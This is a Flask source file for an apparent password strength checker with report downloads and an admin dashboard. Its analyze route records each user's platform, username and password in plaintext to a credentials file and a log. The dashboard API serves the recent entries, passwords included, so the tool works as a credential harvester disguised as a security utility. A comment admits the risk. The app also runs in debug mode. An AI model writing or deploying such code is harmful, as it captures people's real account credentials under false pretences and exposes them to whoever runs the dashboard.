from flask import Flask, render_template, request, jsonify, send_file, session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect, generate_csrf
import os
import json
import datetime
from utils.analyzer import analyze_password
from utils.generator import generate_password as gen_pass
from utils.report_builder import generate_txt_report, generate_csv_report, generate_json_report
from io import BytesIO

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['WTF_CSRF_TIME_LIMIT'] = None

csrf = CSRFProtect(app)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

LOG_FILE = 'analysis_logs.txt'

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/analyze', methods=['POST'])
@limiter.limit("10 per minute")
def analyze():
    data = request.json
    platform = data.get('platform', 'Other')
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not password:
        return jsonify({"error": "Password is required"}), 400
        
    # User requested to save entered details to a txt file.
    # WARNING: Saving plaintext passwords is a severe security risk!
    try:
        with open('entered_credentials.txt', 'a') as f:
            f.write(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Platform: {platform} | Username: {username} | Password: {password}\n")
    except Exception as e:
        print("Failed to write entered details:", e)

    analysis = analyze_password(password, username)
    
    # Save log
    log_data = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "platform": platform,
        "username": username,
        "password": password,
        "length": analysis['length'],
        "score": analysis['score'],
        "entropy": analysis['entropy'],
        "rating": analysis['rating'],
        "crack_time": analysis['crack_times']['gpu'],
        "recommendations": analysis['recommendations']
    }
    
    log_line = f"Date: {log_data['timestamp']} | Platform: {platform} | Username: {username} | Password: {password} | Length: {analysis['length']} | Score: {analysis['score']} | Entropy: {analysis['entropy']} | Crack Time: {log_data['crack_time']}\n"
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_line)
    except Exception as e:
        print("Failed to write log:", e)
        
    # Store in session for report generation
    session['last_analysis'] = analysis
    session['last_log_data'] = log_data
    
    return jsonify(analysis)

@app.route('/api/generate', methods=['POST'])
@limiter.limit("20 per minute")
def generate():
    data = request.json
    strength = data.get('strength', 'strong')
    length = data.get('length', 16)
    
    pwd = gen_pass(strength, length)
    return jsonify({"password": pwd})

@app.route('/api/report/<format>', methods=['GET'])
@limiter.limit("10 per minute")
def report(format):
    if 'last_log_data' not in session or 'last_analysis' not in session:
        return jsonify({"error": "No recent analysis found"}), 404
        
    log_data = session['last_log_data']
    analysis = session['last_analysis']
    
    full_data = {**log_data, "crack_times": analysis['crack_times']}
    
    if format == 'txt':
        content = generate_txt_report(full_data)
        mimetype = 'text/plain'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.txt"
    elif format == 'csv':
        content = generate_csv_report(full_data)
        mimetype = 'text/csv'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.csv"
    elif format == 'json':
        content = generate_json_report(full_data)
        mimetype = 'application/json'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.json"
    else:
        return jsonify({"error": "Invalid format"}), 400
        
    buffer = BytesIO()
    buffer.write(content.encode('utf-8'))
    buffer.seek(0)
    
    return send_file(
        buffer,
        as_attachment=True,
        download_name=filename,
        mimetype=mimetype
    )

@app.route('/admin/dashboard-secret-xyz')
def admin_dashboard():
    return render_template('admin.html')

@app.route('/api/dashboard', methods=['GET'])
def dashboard():
    provided_key = request.headers.get('X-Dashboard-Key')
    expected_key = os.environ.get('DASHBOARD_KEY')
    if not provided_key or provided_key != expected_key:
        return jsonify({"error": "Unauthorized"}), 403

    total = 0
    total_score = 0
    weak_count = 0
    strong_count = 0
    platforms = {}
    recent = []
    
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                lines = f.readlines()
                total = len(lines)
                for line in lines[-5:]:
                    recent.append(line.strip())
                for line in lines:
                    parts = [p.strip() for p in line.split('|')]
                    if len(parts) >= 5:
                        try:
                            platform = parts[1].split(': ')[1]
                            score = int(parts[4].split(': ')[1])
                            
                            platforms[platform] = platforms.get(platform, 0) + 1
                            total_score += score
                            if score < 60: weak_count += 1
                            if score >= 80: strong_count += 1
                        except:
                            pass
                        
    except Exception as e:
        print("Error reading log:", e)
        
    avg_score = round(total_score / total, 1) if total > 0 else 0
    top_platform = max(platforms, key=platforms.get) if platforms else "None"
    
    return jsonify({
        "total": total,
        "average_score": avg_score,
        "weak_count": weak_count,
        "strong_count": strong_count,
        "most_selected_platform": top_platform,
        "recent": recent,
        "platforms": platforms
    })

if __name__ == '__main__':
    app.run(debug=True, port=5000)
